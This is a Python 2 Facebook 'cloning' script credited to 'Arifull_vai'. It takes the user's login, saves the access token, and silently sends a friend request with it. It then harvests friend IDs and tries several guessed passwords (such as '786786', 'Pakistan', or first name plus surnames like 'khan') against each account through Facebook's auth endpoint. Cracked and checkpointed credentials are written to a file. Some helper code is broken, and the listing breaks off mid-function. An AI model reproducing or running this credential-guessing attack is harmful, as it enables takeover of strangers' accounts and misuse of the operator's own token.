#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:love_hacker
##### LOGO #####
logo = """             ░█████╗░██████╗░██╗███████╗
       \033[1;91m:██╔══██╗██╔══██╗██║██╔════╝
      \033[1;92m  ███████║██████╔╝██║█████╗░░     
     \033[1;93m:  ██╔══██║██╔══██╗██║██╔══╝░░      
    \033[1;94m::  ██║░░██║██║░░██║██║██║░░░░░      
   \033[1;95m:::  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░        
  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
  \033[1;91m:》》》\033[1;93m+923094161457\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Arifull_vai-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................Arifull_vai......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Bangladesh
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mArifull_vai\033[1;95m♡╰──────────•◈•──────────╯♡"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
  \033[1;96m         
  \033[1;96m        
  \033[1;96m  
 \033[1;96m    ::::^^^^^~~~~!!!!77?????JJJYYYYYY5555555PPPPPPPPPPPPPPPPPPPPPPPPP55555555YYYYJJJJ???7777!!!!~~~^^^^:
:::^^^^~~~!!!!7777???JJJYYYYY5555555PPPPPPPPPGGGGGGGGGGGGGGGGPPPPPPPPPP55555YYYJJJJ???777!!!!~~~^^^^
::^^^~~~~!!!777????JJJYYYY55555PPPPPPPGGGGGGGGGGGGGGGGGGGGGGGGGGGGGPPPPPPP55555YYYJJ????777!!!~~~~^^
::^^~~~!!!!77????JJJYYY555555PPPPPGGGGGGGGGGGGGGBBBBBBGGGGGGGGGGGGGGGGGPPPPPP5555YYYJJJ????77!!!~~~^
^^^~~~!!!777????JJYYY55555PPPPPPGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBGGGGGGGGGGGGPPPPP555YYYJJJ????777!!~~~
^^^~~!!7777??JJJJYY55555PPPPPGGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGGGGPPPPP5555YYJJJ????77!!!~
^~~~!!777???JJYYYY555PPPPPGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGGGPPPPP555YYYJJJ??7777!!
~~!!!77???JJJYYY555PPPPPGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGGPPPP5555YYJJJ??777!!
~~!!77???JJYYY5555PPPPGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGGPPPP555YYJJJ???77!
~!!77???JJYYY555PPPPPGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGPPPP555YYYJJJ??77
!!77???JJYYY555PPPPPGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBB###########BBBBBBBBBBBBBBBBBGGGGGPPPP5555YYJJJ??7
!77??JJJYYY555PPPPPGGGGGGGGGBBBBBBBBBBBBBBBBBB#####BBBBBP5Y5PBB####BBBBBBBBBBBBBGGGGGGPPPP555YYYJJ??
77??JJJYYY555PPPPPGGGGGGGGGBBBBBBBBBBBBBBBBBBBGP5YYJYYJJ7^^^^~!7Y5PGBB###BBBBBBBBGGGGGGPPPP555YYYJJ?
7??JJJYY55555PPPPPGGGGGGGGBBBBBBBBBBBBBBBBGY7!^^^:^~7JYY7^:^^^~~~~~~!7?YPGBBBBBBBBGGGGGGPPPP555YYJJJ
??JJJYY55555PPPPPGGGGGGGGGBBBBBBBBBBBBGY7~:.   .....  .^7~::^::^^~~~~~~~^~!?5PGBBBBGGGGGGPPPP555YYJJ
?JJJYY55555PPPPPPGGGGGGGGGBBBBBBBBBB5^....  .. ..       .7J?BPJ!^:~~!!!!!!~~!?JYGBBGGGGGGPPPPP55YYYJ
JJJYYY55555PPPPPGGGGGGGGGGBBBBBBBGBJ. ...........:^~~~!.  :J####GY~:^~!!!777JPPJ?PBBGGGGGGPPPP555YYY
JJYYY5555PPPPPPPGGGGGGGGGBBBBBBBBGB^ .    ...^!J5PGGP5P7...P#B####BP7^:^~~7YPY77!?BBGGGGGGPPPP5555YY
JYYY55555PPPPPPGGGGGGGGGGBBBBBBBBBBY. ..  .:^5GBBGGGPY5G57:P#####B###BY!::^?5J!!77GBBGGGGGGPPPP5555Y
JYY55555PPPPPPGGGGGGGGGBBBBBBBBBBBBBP^ ..!??7J5G#&BJ!~~JBB^G#####BBBBB##7.^!777777GBBGGGGGGPPPPP5555
Y555555PPPPPGGGGGGGGGGBBBBBBBBBBBBBBBB^ :7!~~7:^J#P7J7^?BG7PG########B#G^^!77???!7BBBBGGGGGPPPPP5555
JYYY55PGGGPGGGGGGGGGGGGGGBBBBBBBBBB##PJ!.!YJ?5JJ7GGPGPPB##JGG#########B!^~?JJJJ?~JBBBBGGGGGGPPPPP555
::^^^!?555YYJJYY5PP5Y55P5PGGGGGGGP5PBG5P~~5B###5JB#BB####GJPGBBBBBBBBB?~77JYYYJ?75BBGGGGPPPPPP5555YY
......:::^^^^^^^^^^::^7?~~7?7777!^^!5GJ5Y:7PGBBJ!?Y7J5GBG7JBBBGGGGGGBG~?J?Y55YJ?7PGGGPPPPP5555YYYYJJ
~~!!~::^~~!!!!!!!!!!~~~~^~!7!~!~:..:!JJ7!:.~?7^^!JYJ!^!Y~.!J?JJYY5YJY!!YYJ555YY?7JJ5PP5JJ555555YYYJJ
.^~^. ..:^!777!~!!777!~~7?JY555Y~...:!J?7!. .~JJY5Y555!~.:?...:^^~^:.:J5YY555YJ7:.:^^^^::~!~!!~~~~~~
  ..     ..:::.   ...  .::.:^~!~:....^~!!!^. .^!?Y5J!:..^5G^:^^~^:::..?5YY55YY7...::::..............
.         ...:....... ...:::::::.   ....::^^.    ..   ^J55PPJ!~~~^.....7JJY5Y7..!~~?JJ7^::~7JJJJJ??7
..       ..........:...::..:::::..      ..... .::~^!J5GG5J77!::7~. . :  ^!?Y!...!7JYJJYJ!^^^!JYJJ5PP
:::......::^^^:.....  .:^^:....................^!JPGGGPJ!:::^^^:. .. :.  .:..:..::^^^:^^.....^^::^~~
.... ..:::.......:::.....:^^^^^^^:.......:^~~:.:75Y7~^:..^~?G: ......::  ...:. .................... 
       ..:^^^:::..............:::::.... ..^~~^~~::.....^~G5!!..::....^:. ...............:~!!!!777!~^
  ....... ..:::................::::..   ...::7!:::::::!^!Y~::::^::::.^^ .........:^~~:...^!7777?Y555
    ..:^:.  .......:^~^^^:.............::::::^^::::::^~~:?!~~~?GBJ^^.::.......:.....::.....::^^^!77?
.      .:::::....:^^^::....::^^^:::::..:..:::^^^^^~~!7!7~&BGBBY?7!^^::...:...~?JJ7~^^~!!7777!!!!777?
~:.    ....:~~^^^^~^:......:!?!~^::^^::....~!~~~!7??!7GJ~#5!!~?Y5PPPY~..::.:~JBBGGGPPPGGGGBBBGGGPPPP
^^:..  .....:~7!~~~~^:::....:~7??!^::::::.^??YGGPP5Y7PJJY#PY5J?!~^^::::::::^^5BBBBBBBBBBBBGGGGGGGGGP
:^^^^:.......:~7?JJJJJ?????JJ5PPPP5JJJY5P!YPY7~~!!7J?@B??BP^::..:::^^^::::::^5BBBBBBBBBBBBBGGGGGGGGG
.:^^^::...:::::~777?7~~~!!7JYY5Y55PPGGGPP5J~?JYJJ?7!.&G:~YP.^!77??JYY?::::::^PGGGGGBBBBBBBBBGGGGGGGG
.::^^..  ..:::::::^!J555PPPPPPP5PPPPPPPPPPY?!^::..~!^B&!J5&7?JJJJJ???!::^^::~GGGGGGGGGGBBGGGGGGGGPPP
....::^^^^:^^~!7!!?JYYJ7JPBBBBBBBBBBBBBBGJ^.:::^^7?Y?G@JJYP^^^:::::::.::^^::?GP5555PPPPPPPGGGGPP5YJJ
...:~7?Y5555PPGBBBBBPJ!^~JPBBBBBBBBBBBB#B!~~77??7!~7~?@7^^..:::::::::.::^^.^PPPPPPPPPPPPPPPPPPPP5Y??
??J5GGGGBBBBBBBBBBBBBBBBBBB#BBBBBBBBBBBBB?J?77!:...~::&Y^.::::::::::::.:^^.!PPPPPPP555YYYYYYYY55555Y
Y55555PPPPGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBY~:::....:!^:#BJ.::::::::::::..^^.?55555YJ?77!77777??????JY
Y5555PPPPPGGGGGGBBBGGGGGGGBBBBBBBBBBBBBBBY^.:..:.:.~~:7P?..::::::::::::.^:.JYY555YJJ??JJJJJJ????7??J
Y555555PPPPPPGGGGGGBBBBBBBBBBBBBBBBBBBBBBY~^.::.:.:!^~~B?:::::::::::::^.:::YYYYYYYYYYYY5555P5555YYYY
YY555PPPPPPPPPGGGGBBBBBBBBBBBBBGBBGGGBBBG!!..:::.::?^^!B7::::::::::::.^:::!P5555YYJJJJJJ???????????J
YY55555PPPPPPPPGGGGGGGGGGGGGGGGGGGGGGGGPY.:.:::.::!&^~!B~.:::::::::::.^^::5GPGGGGPPPPPPP55YJJJJJ???J
YYY5555555555555PP5555P5PPPPPPPPPPPPPGPY!...::.:::5@~~!#^.:::::::::::::^:!GGPPGGGGGGGGGGGGPPPP5555YY
JJJJJYYY5555PPPPPPPPPPGGGGGGGGPPPPP5YYYY7:!:::::^.Y@~~!#^.::::::::::::^^:7BGGGGGGPGGGGPPPPPPPPPPPP55
JJYY5555PPPPPGGPPPPGGGGGGGPPPPPPP5YJJJY5J:~:.::^!.Y&^~!B:..::::::::::.^^:~GGGPPPPPPPPP555PPPP5555555
JJJYYYY55Y5555555555555555YYJJJYYYYYYYYY?..:::.^7:5@^~!#:..:::::::::..:^:~5P55YYYYY555555555555YYJJJ
~!7777???77!~^~77?????JJJJ?7?JYYYJJYY55?:.::::.:!:5&:~!#::::::::::::...^^~PPP555PP5YJJY55555YYYYJJ?7
::::::^^^^~~~^^^^^^~~~~!77!7J55PPPGGGBJ^:.:::..^!:5@^~7#:::.::::::::.:..^~P555PPPP5YYY555YJJJJJJYJ?7
::::::::::^^^^~!77!~!!777?JY5PPGGGGGP7:~^:::..:^7:J@^~7#:..:::::::::..:::!PPPPGGPP5YYY55Y??JYYYJ??7!
~~!!!~~~^^::::^!77!!?YPPP5PPGGGGPPPJ^:~!!::....:7:7@^~7#:.::::::::::...::!Y55YYYJJ??J?777?Y555YJ?77!
~!77???7!~^~~~!J5YY555PPPP555555P5!::~!!7:.....:!^~@!^!#:...::::::::..:..~?J??77?7!!!~~~~~777JYYYJ7~
::^^^~~~~!!!7!!7?!~!7!!7?J??JYYYJ^:::^~!!:......~~:&?:~G~...::::::::..:^:^PP55555555YJJJJ??77????77?
^:::::^^^^^~~~~~!!~^~!!!7???JYYJ:^:.:::~^.......^!:#G.~P7...:.:::::.....::5PPP555555555YYJJJ?7777!77
:::...:^::::::^^^^^^~!7777??JYY^.^~~~:!Y........:!:GG.~G~..:..:::::....:::JP5YYYYYJJJ??7!!~~!!!!!~^^
^^~^^~!!~~!!!7?JYJ?77?JJYYY555Y~.:^^~!^~........:~.GP.~G~.............::::JYY5YJ??JJJ?7!!!~^:::::::.
^^~!!7777????J?77?77777!!!!7?JJ7:..^:!^..........~.YG.^P~..............:::7???JJ????7~~~~!7!~^:.....
^^~~~~!!77!!~!!~~!!77?JJ??????JJJ7.:!!^..........::!#::P^..............::?YYYJYYYYYJ7!~^^^~~~~^:::::
~~~~~~!!!!!!77??7!~7???JYYYYYJJYJJ?^~7~...........:~B..77...............^YYJ?77!!7????7!~!!!~~^^^^^^
^^^~~~~~~~~!!!!!~~~~^:^~~~!!!7JJJ???^............:::7:^!!~~^~^^^:^~~~::.^JJJJJ??7!!!!77777!!~~^^^::.
:::^^^^:^^^^^:::^~~~^~!!!~!!7?JYJ?J?!. ....:~7!^~~~~:::::.:^~^~~^!!J??JY?????77!!~~~~~~~!~~^^::::::.
:::^^^^^^^^^^:::^^^~~~~~~^^~~~!?JJJ?7.:^^^^~J?7^~~~~~~~^^~!7???7~~!J7?JJ7!!!!!!!!!~~~^~~~^^:::::....
....:::::::^^~~!~~~~!!!!~~~!!!77JJYYJ^^77^::!?7~^^^~!?J7!!!!7?J7^^^?!7YJ!!~~~~!77!~^^::::::::::.....
......::::::^~~~~~~~^::::::::::^^^~^^^~J?~:..~77~~^~7JY?7~~~~!!!~^::^~77!~!!~^~~~~~~^:......::......
...........::::::::^^^:::^^^^^^:::::.:^7?~::.:!!::^~!??77!!!!!!!~::^:~~7!!!!~^^::::::...............
 \033[1;96m 
 \033[1;96m 
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To Arifull Vai▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mArifull_vai\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91Arifull_vai
\033[1;94Arifull_vai\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;91m: \033[1;91Arifull Islam
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+8801721286071
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mArifull_vai\033[1;95m♡╰──────────•◈•──────────╯♡"""
jalan('              \033[1;96m.............Arifull_vai.....................:')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Arifull_vai\033[1;95m♡╰──────────•◈•──────────╯♡"

CorrectUsername = "Arifull"
CorrectPassword = "vai"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Arifull_vai
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://youtube.com/c/1onebangla402')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/Mdarifullislam2021')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mArifull_vai\033[1;95m♡──────────•◈•──────────♡"
		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful...'
				os.system('https://www.facebook.com/Mdarifullislam2021')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Arifull_vai
	print logo
	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."
	print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Public ID..."
	print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
		jalan('\033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────╯♡"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mArifull_vai\033[1;95m♡──────────•◈•──────────♡"
	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mArifull_vai\033[1;95m♡──────────•◈•──────────♡"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Arifull_vai
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = a['first_name'] + 'rajpoot'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + 'mughal'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'malik'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'khan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + 'afridi'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
